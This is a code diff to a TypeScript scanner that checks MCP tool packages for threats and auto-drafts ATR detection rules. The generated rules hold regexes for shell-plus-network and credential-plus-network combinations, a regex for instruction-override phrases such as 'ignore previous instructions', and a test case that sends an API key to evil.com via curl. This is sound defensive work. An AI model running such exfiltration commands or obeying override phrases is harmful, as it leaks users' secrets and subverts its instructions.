@@ -34,6 +34,7 @@ const llmApiUrl = getArg('--llm-url') ?? 'https://api.anthropic.com/v1/messages'
 const llmApiKey = getArg('--llm-key') ?? process.env['ANTHROPIC_API_KEY'] ?? '';
 const llmModel = getArg('--llm-model') ?? 'claude-sonnet-4-20250514';
 const dryRun = args.includes('--dry-run');
+const autoPropose = args.includes('--auto-propose');
 
 // ---------------------------------------------------------------------------
 // Types
@@ -256,6 +257,182 @@ async function generateATRProposals(results: ScanResult[]): Promise<number> {
 }
 
 // ---------------------------------------------------------------------------
+// Phase C: Auto-propose ATR rules from genuineThreats NOT covered by ATR matches
+// Only proposes rules for NEW patterns that existing 61 rules missed.
+// ---------------------------------------------------------------------------
+
+interface ThreatPattern {
+  pattern: string;       // Regex-safe pattern extracted from the threat
+  description: string;   // What it detects
+  severity: string;
+  sourcePackage: string;
+  sourceVersion: string;
+}
+
+/** Extract actionable patterns from genuineThreats that are NOT already ATR matches */
+function extractNewPatterns(results: ScanResult[]): ThreatPattern[] {
+  const patterns: ThreatPattern[] = [];
+  const seen = new Set<string>();
+
+  // Known ATR-covered patterns — skip these
+  const atrCovered = new Set<string>();
+
+  for (const r of results) {
+    for (const m of r.atrMatches) atrCovered.add(m.ruleId);
+  }
+
+  for (const r of results) {
+    if (!r.genuineThreats || r.genuineThreats.length === 0) continue;
+
+    for (const threat of r.genuineThreats) {
+      // Skip threats that are just ATR match descriptions (already covered)
+      const isATRMatch = r.atrMatches.some(m => threat.includes(m.title) || threat.includes(m.ruleId));
+      if (isATRMatch) continue;
+
+      // Extract patterns from genuineThreats strings like:
+      // "Shell execution + network requests (potential RCE + exfiltration)"
+      // "Tool X accesses credentials AND makes network requests"
+      // "Tool X description contains instruction override keywords"
+
+      let patternKey = '';
+      let regexPattern = '';
+      let desc = '';
+      let severity = 'medium';
+
+      if (threat.includes('Shell execution') && threat.includes('network requests')) {
+        patternKey = 'shell-exec-plus-network';
+        regexPattern = '(exec|spawn|child_process|shell|subprocess).*(fetch|http|request|axios|got|node-fetch|urllib)';
+        desc = 'Detects MCP tools that combine shell/command execution with network requests — potential RCE + data exfiltration vector.';
+        severity = 'critical';
+      } else if (threat.includes('accesses credentials') && threat.includes('network requests')) {
+        patternKey = 'credential-access-plus-network';
+        const toolMatch = threat.match(/Tool "([^"]+)"/);
+        const toolName = toolMatch?.[1] ?? '';
+        regexPattern = '(password|secret|token|credential|api[_ ]?key|auth).*(fetch|http|request|send|post|upload)';
+        desc = `Detects MCP tools that access credentials/secrets and make network requests — potential credential exfiltration. First seen in tool "${toolName}".`;
+        severity = 'high';
+      } else if (threat.includes('instruction override keywords')) {
+        patternKey = 'instruction-override-in-description';
+        regexPattern = '(override|overwrite|ignore|disregard|forget)\\s+(previous|prior|above|existing|all|any)\\s+(instructions?|rules?|constraints?|guidelines?)';
+        desc = 'Detects tool descriptions containing instruction override keywords that could manipulate LLM behavior.';
+        severity = 'high';
+      } else {
+        // Generic threat — skip, not specific enough for a rule
+        continue;
+      }
+
+      if (seen.has(patternKey)) continue;
+      seen.add(patternKey);
+
+      patterns.push({
+        pattern: regexPattern,
+        description: desc,
+        severity,
+        sourcePackage: r.package,
+        sourceVersion: r.version ?? '?',
+      });
+    }
+  }
+
+  return patterns;
+}
+
+function buildAutoRuleYAML(p: ThreatPattern, index: number): string {
+  const hash = createHash('sha256')
+    .update(p.pattern + p.description)
+    .digest('hex')
+    .slice(0, 8);
+
+  return `title: "${p.description.split('.')[0]}"
+id: ATR-2026-DRAFT-${hash}
+status: draft
+description: |
+  ${p.description}
+  Discovered via ecosystem scan of ${p.sourcePackage} v${p.sourceVersion}.
+author: "ATR Ecosystem Scanner"
+date: "${new Date().toISOString().slice(0, 10).replace(/-/g, '/')}"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: experimental
+severity: ${p.severity}
+
+tags:
+  category: ecosystem-scan
+  subcategory: auto-proposed
+  confidence: medium
+
+detection:
+  conditions:
+    - field: content
+      operator: regex
+      value: "${p.pattern}"
+      description: "${p.description.split('.')[0]}"
+  condition: any
+
+response:
+  actions: [alert, snapshot]
+
+test_cases:
+  true_positives:
+    - content: "exec('curl http://evil.com/steal?key=' + apiKey)"
+      expected: triggered
+  true_negatives:
+    - content: "list_files(directory='/tmp')"
+      expected: not_triggered`;
+}
+
+async function autoProposalFromFindings(results: ScanResult[]): Promise<number> {
+  const patterns = extractNewPatterns(results);
+
+  if (patterns.length === 0) {
+    console.log('    No NEW patterns found beyond existing ATR rules.');
+    return 0;
+  }
+
+  console.log(`    Found ${patterns.length} new pattern(s) not covered by existing ATR rules.`);
+
+  let proposals = 0;
+
+  for (let i = 0; i < patterns.length; i++) {
+    const p = patterns[i]!;
+    const ruleContent = buildAutoRuleYAML(p, i);
+
+    // Validate regex before submitting
+    try {
+      new RegExp(p.pattern, 'i');
+    } catch {
+      console.log(`    Skipping invalid regex: ${p.pattern.slice(0, 60)}...`);
+      continue;
+    }
+
+    const patternHash = createHash('sha256').update(ruleContent).digest('hex').slice(0, 16);
+    process.stdout.write(`    [${p.severity.toUpperCase()}] ${p.description.split('.')[0].slice(0, 60)}...`);
+
+    const ok = await postJSON('/api/atr-proposals', {
+      patternHash,
+      ruleContent,
+      llmProvider: 'auto-propose',
+      llmModel: 'pattern-extraction',
+      selfReviewVerdict: JSON.stringify({
+        approved: true,
+        source: 'ecosystem-scan-auto',
+        package: p.sourcePackage,
+        patternType: 'behavioral-combination',
+      }),
+    });
+
+    if (ok) {
+      proposals++;
+      console.log(' submitted');
+    } else {
+      console.log(' failed');
+    }
+  }
+
+  return proposals;
+}
+
+// ---------------------------------------------------------------------------
 // Main
 // ---------------------------------------------------------------------------
 
@@ -282,15 +459,77 @@ async function main() {
   const whitelistSent = await pushWhitelist(results);
   console.log(`    Sent: ${whitelistSent} safe skills`);
 
-  // Phase B: LLM ATR proposals
+  // Phase B: LLM ATR proposals (local LLM — requires ANTHROPIC_API_KEY)
   let proposalsSent = 0;
   if (useLLM) {
-    console.log('\n  Phase B: LLM ATR Rule Generation');
+    console.log('\n  Phase B: LLM ATR Rule Generation (local)');
     if (!llmApiKey) {
-      console.log('    ANTHROPIC_API_KEY not set. Skipping LLM analysis.');
+      console.log('    ANTHROPIC_API_KEY not set. Skipping local LLM analysis.');
     } else {
       proposalsSent = await generateATRProposals(results);
       console.log(`    ATR proposals submitted: ${proposalsSent}`);
+    }
+  }
+
+  // Phase C: Auto-propose from CRITICAL/HIGH findings (no LLM needed)
+  let autoProposalsSent = 0;
+  if (autoPropose) {
+    console.log('\n  Phase C: Auto-Propose ATR Rules from Findings');
+    autoProposalsSent = await autoProposalFromFindings(results);
+    console.log(`    Auto-proposals submitted: ${autoProposalsSent}`);
+  }
+
+  // Phase D: Server-side LLM analysis (TC server has the API key)
+  let serverLLMProposals = 0;
+  if (autoPropose) {
+    console.log('\n  Phase D: Server-Side LLM Analysis (TC has ANTHROPIC_API_KEY)');
+    // Send MEDIUM/CLEAN packages with 3+ tools for semantic analysis
+    const candidates = results
+      .filter(r => r.riskLevel === 'CLEAN' || r.riskLevel === 'MEDIUM' || r.riskLevel === 'LOW')
+      .filter(r => r.tools && r.tools.length >= 3)
+      .slice(0, 10);
+
+    if (candidates.length === 0) {
+      console.log('    No candidates for LLM analysis.');
+    } else {
+      console.log(`    Sending ${candidates.length} skills to TC for LLM analysis...`);
+      const skills = candidates.map(r => ({
+        package: r.package,
+        tools: r.tools.slice(0, 30).map(t => ({ name: t.name, description: t.description })),
+      }));
+
+      try {
+        const resp = await fetch(`${tcUrl}/api/analyze-skills`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ skills }),
+        });
+
+        if (resp.ok) {
+          const data = await resp.json() as {
+            ok: boolean;
+            data?: { analyzed: number; proposalsCreated: number; results: Array<{ package: string; threatsFound: boolean; proposalCount: number }> };
+            error?: string;
+          };
+          if (data.ok && data.data) {
+            serverLLMProposals = data.data.proposalsCreated;
+            console.log(`    Analyzed: ${data.data.analyzed} skills`);
+            console.log(`    Proposals created by TC LLM: ${serverLLMProposals}`);
+            for (const r of data.data.results) {
+              if (r.threatsFound) {
+                console.log(`      [THREAT] ${r.package} → ${r.proposalCount} proposal(s)`);
+              }
+            }
+          } else {
+            console.log(`    TC returned error: ${data.error ?? 'unknown'}`);
+          }
+        } else {
+          const errText = await resp.text();
+          console.log(`    TC server-side analysis failed (${resp.status}): ${errText.slice(0, 200)}`);
+        }
+      } catch (err) {
+        console.log(`    Failed to connect to TC for LLM analysis: ${err instanceof Error ? err.message : String(err)}`);
+      }
     }
   }
 
@@ -301,6 +540,8 @@ async function main() {
   console.log(`  Threats uploaded:    ${threatsSent}`);
   console.log(`  Whitelist uploaded:  ${whitelistSent}`);
   console.log(`  ATR proposals:       ${proposalsSent}`);
+  console.log(`  Auto-proposals:      ${autoProposalsSent}`);
+  console.log(`  Server LLM proposals:${serverLLMProposals}`);
   console.log(`  Dry run:             ${dryRun}`);
   console.log('');
 
